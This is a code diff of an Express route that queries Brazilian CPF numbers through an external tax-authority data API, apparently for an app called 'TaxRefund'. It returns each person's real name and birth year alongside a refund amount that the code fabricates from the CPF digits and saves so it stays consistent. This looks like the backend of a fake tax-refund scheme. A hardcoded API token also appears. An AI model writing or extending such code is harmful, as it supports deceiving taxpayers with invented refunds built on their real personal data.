@@ -647,165 +647,114 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
-  // Rota para consulta de CPF - Integrando com a API da Receita Federal
+  // Rota para consulta de CPF via API Exato Digital
   app.get("/api/consulta-cpf", async (req: Request, res: Response) => {
-    const { cpf } = req.query;
-
-    if (!cpf || typeof cpf !== "string") {
-      return res.status(400).json({
-        Status: {
-          Codigo: 400,
-          Mensagem: "CPF INVÁLIDO OU NÃO FORNECIDO"
-        }
-      });
-    }
-
-    // Remover qualquer formatação do CPF
-    const cpfLimpo = cpf.replace(/\D/g, "");
-
-    if (cpfLimpo.length !== 11) {
-      return res.status(400).json({
-        Status: {
-          Codigo: 400,
-          Mensagem: "CPF INVÁLIDO"
-        }
-      });
-    }
-
     try {
-      // Verificar se já existe uma restituição para esse CPF no banco
-      const valorRestituicao = await getValorRestituicaoByCpf(cpfLimpo);
-      
-      // Obter token da API da receita das variáveis de ambiente
+      const { cpf } = req.query;
+
+      if (!cpf || typeof cpf !== "string") {
+        return res.status(400).json({ error: "CPF inválido ou não fornecido" });
+      }
+
+      const cpfLimpo = cpf.replace(/\D/g, "");
+
+      if (cpfLimpo.length !== 11) {
+        return res.status(400).json({ error: "CPF deve conter 11 dígitos" });
+      }
+
       const apiToken = process.env.API_TOKEN_RECEITA || '268753a9b3a24819ae0f02159dee6724';
-      
-      // Consultar a API da Receita Federal para obter os dados do CPF
-      const apiUrl = `https://api.exato.digital/receita-federal/cpf?token=${apiToken}&cpf=${cpfLimpo}&format=json`;
-      console.log(`[API Receita] Consultando CPF ${cpfLimpo} na API externa:`, apiUrl);
-      
-      const apiResponse = await fetch(apiUrl, {
+
+      if (!apiToken) {
+        return res.status(500).json({ error: "Token da API não configurado" });
+      }
+
+      const response = await fetch(`https://api.exato.digital/receita-federal/cpf?token=${apiToken}&cpf=${cpfLimpo}&format=json`, {
+        method: "GET",
         headers: {
-          'Accept': 'application/json',
-          'User-Agent': 'TaxRefund/1.0'
+          "Content-Type": "application/json"
         }
       });
-      
-      if (!apiResponse.ok) {
-        throw new Error(`Erro na API da Receita: ${apiResponse.status}`);
-      }
-      
-      const dadosCpf = await apiResponse.json();
-      console.log(`[API Receita] Resposta da API para CPF ${cpfLimpo}:`, dadosCpf);
-      
-      // Calcular valor da restituição se não existir
-      if (valorRestituicao === null) {
-        // Gerar um valor baseado no CPF (para sempre dar o mesmo valor para o mesmo CPF)
-        const valorBase = 1800 + (parseInt(cpfLimpo.substring(0, 3)) % 1200);
-        const centavos = parseInt(cpfLimpo.substring(9, 11));
-        const valorCalculado = valorBase + (centavos / 100);
-        
-        // Salvar para uso futuro
-        await salvarValorRestituicao(cpfLimpo, valorCalculado);
-        
-        // Formatar apenas o ano de nascimento (se disponível)
-        let anoNascimento = '';
-        if (dadosCpf.Result && dadosCpf.Result.DataNascimento) {
-          // Extrair apenas o ano se vier no formato DD/MM/AAAA
-          const dataParts = dadosCpf.Result.DataNascimento.split('/');
-          if (dataParts.length === 3) {
-            anoNascimento = dataParts[2];
-          } else {
-            // Fallback para ano calculado
-            anoNascimento = `${1950 + (parseInt(cpfLimpo.substring(5, 9)) % 51)}`;
-          }
-        } else {
-          // Fallback para ano calculado
-          anoNascimento = `${1950 + (parseInt(cpfLimpo.substring(5, 9)) % 51)}`;
+
+      if (!response.ok) {
+        let errorBody;
+        try {
+          errorBody = await response.json();
+        } catch {
+          errorBody = { message: response.statusText };
         }
-        
-        // Retornar resultado com os dados da API
-        return res.status(200).json({
-          Result: {
-            NumeroCpf: cpfLimpo,
-            NomePessoaFisica: dadosCpf.Result?.NomePessoaFisica || `NOME CLIENTE CPF ${cpfLimpo.substring(0, 4)}`,
-            DataNascimento: anoNascimento,
-            ValorRestituicao: valorCalculado
-          },
-          Status: {
-            Codigo: 1,
-            Mensagem: "DADOS ENCONTRADOS"
-          }
+
+        let mensagemErro = "Erro na consulta do CPF";
+        if (response.status === 404) {
+          mensagemErro = "CPF não encontrado na base de dados";
+        } else if (response.status === 401 || response.status === 403) {
+          mensagemErro = "Erro de autenticação com a API";
+        } else if (response.status >= 500) {
+          mensagemErro = "Serviço temporariamente indisponível";
+        }
+
+        return res.status(response.status).json({ 
+          error: mensagemErro, 
+          detalhes: errorBody,
+          statusCode: response.status
         });
       }
-      
-      // Se já existir, retornar o valor do banco com os dados da API
-      // Formatar apenas o ano de nascimento (se disponível)
-      let anoNascimento = '';
-      if (dadosCpf.Result && dadosCpf.Result.DataNascimento) {
-        // Extrair apenas o ano se vier no formato DD/MM/AAAA
-        const dataParts = dadosCpf.Result.DataNascimento.split('/');
-        if (dataParts.length === 3) {
-          anoNascimento = dataParts[2];
-        } else {
-          // Fallback para ano calculado
-          anoNascimento = `${1950 + (parseInt(cpfLimpo.substring(5, 9)) % 51)}`;
-        }
-      } else {
-        // Fallback para ano calculado
-        anoNascimento = `${1950 + (parseInt(cpfLimpo.substring(5, 9)) % 51)}`;
+
+      const responseText = await response.text();
+      const data = responseText.trim() ? JSON.parse(responseText) : null;
+
+      if (!data) {
+        return res.status(500).json({ error: "Resposta vazia da API" });
       }
-      
-      return res.status(200).json({
-        Result: {
-          NumeroCpf: cpfLimpo,
-          NomePessoaFisica: dadosCpf.Result?.NomePessoaFisica || `NOME CLIENTE CPF ${cpfLimpo.substring(0, 4)}`,
-          DataNascimento: anoNascimento,
-          ValorRestituicao: valorRestituicao
-        },
-        Status: {
-          Codigo: 1,
-          Mensagem: "DADOS ENCONTRADOS"
-        }
-      });
-    } catch (error) {
-      console.error("Erro ao processar consulta de CPF:", error);
-      
-      // Em caso de erro na API externa, usar dados gerados deterministicamente
+
+      // Se tudo deu certo, verifica se precisamos calcular e armazenar um valor de restituição
       try {
+        // Verificar se já existe uma restituição para esse CPF no banco
         const valorRestituicao = await getValorRestituicaoByCpf(cpfLimpo);
-        let valorCalculado = valorRestituicao;
         
-        if (valorCalculado === null) {
-          // Gerar um valor baseado no CPF
+        // Se não existir, calcular e salvar um valor
+        if (valorRestituicao === null) {
+          // Gerar um valor baseado no CPF (para sempre dar o mesmo valor para o mesmo CPF)
           const valorBase = 1800 + (parseInt(cpfLimpo.substring(0, 3)) % 1200);
           const centavos = parseInt(cpfLimpo.substring(9, 11));
-          valorCalculado = valorBase + (centavos / 100);
+          const valorCalculado = valorBase + (centavos / 100);
           
           // Salvar para uso futuro
           await salvarValorRestituicao(cpfLimpo, valorCalculado);
+
+          // Se os dados da API não tiverem um valor de restituição, adicionar o calculado
+          if (data.Result && !data.Result.ValorRestituicao) {
+            data.Result.ValorRestituicao = valorCalculado;
+          }
+        } else {
+          // Se os dados da API não tiverem um valor de restituição, adicionar o existente no banco
+          if (data.Result && !data.Result.ValorRestituicao) {
+            data.Result.ValorRestituicao = valorRestituicao;
+          }
         }
-        
-        return res.status(200).json({
-          Result: {
-            NumeroCpf: cpfLimpo,
-            NomePessoaFisica: `NOME CLIENTE CPF ${cpfLimpo.substring(0, 4)}`,
-            DataNascimento: `${1950 + (parseInt(cpfLimpo.substring(5, 9)) % 51)}`,
-            ValorRestituicao: valorCalculado
-          },
-          Status: {
-            Codigo: 1,
-            Mensagem: "DADOS ENCONTRADOS"
-          }
-        });
-      } catch (fallbackError) {
-        console.error("Erro ao usar fallback para consulta de CPF:", fallbackError);
-        return res.status(500).json({
-          Status: {
-            Codigo: 99,
-            Mensagem: "ERRO AO PROCESSAR CONSULTA"
-          }
-        });
+      } catch (dbError) {
+        console.error("Erro ao processar valor de restituição:", dbError);
+        // Continuamos sem interromper o fluxo, só não teremos o valor de restituição
       }
+
+      // Ajustar a data de nascimento para mostrar apenas o ano
+      if (data.Result && data.Result.DataNascimento) {
+        try {
+          const dataParts = data.Result.DataNascimento.split('/');
+          if (dataParts.length === 3) {
+            // Substitui a data completa pelo ano
+            data.Result.DataNascimento = dataParts[2];
+          }
+        } catch (dateError) {
+          console.error("Erro ao processar data de nascimento:", dateError);
+          // Se falhar, mantemos o formato original
+        }
+      }
+
+      return res.json(data);
+
+    } catch (error) {
+      console.error("Erro ao consultar CPF:", error);
+      return res.status(500).json({ error: "Erro interno ao processar a consulta" });
     }
   });
 
